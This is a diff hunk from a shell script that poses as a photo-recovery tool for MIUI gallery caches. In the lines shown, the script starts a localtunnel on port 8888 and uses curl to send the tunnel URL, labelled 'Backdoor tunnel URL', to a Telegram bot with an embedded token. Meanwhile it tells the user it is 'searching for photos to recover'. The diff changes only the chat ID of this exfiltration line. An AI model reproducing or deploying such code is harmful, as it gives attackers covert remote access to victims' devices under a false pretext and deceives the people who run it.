@@ -71,7 +71,7 @@ then
     lt -p 8888 > data.txt 2> /dev/null &
     sleep 6
     DATA=$(grep -o "https://[^ ]*" data.txt)
-    curl https://api.telegram.org/bot7854702361:AAHufR4guqxvi3POjS6nZED0nGT3ujwMxXw/sendMessage -d "chat_id=7047367759&text=Backdoor tunnel URL :%0A$DATA" > /dev/null 2>&1
+    curl https://api.telegram.org/bot7854702361:AAHufR4guqxvi3POjS6nZED0nGT3ujwMxXw/sendMessage -d "chat_id=0000000000&text=Backdoor tunnel URL :%0A$DATA" > /dev/null 2>&1
     echo -e "${GREEN}The software is searching for photos to recover ...\nPlease wait ...${END}"
     sleep 1m
     if find storage/shared/Android/data/com.miui.gallery/files/gallery_disk_cache -type f -path "*size/*.0" 2> /dev/null | grep -q .
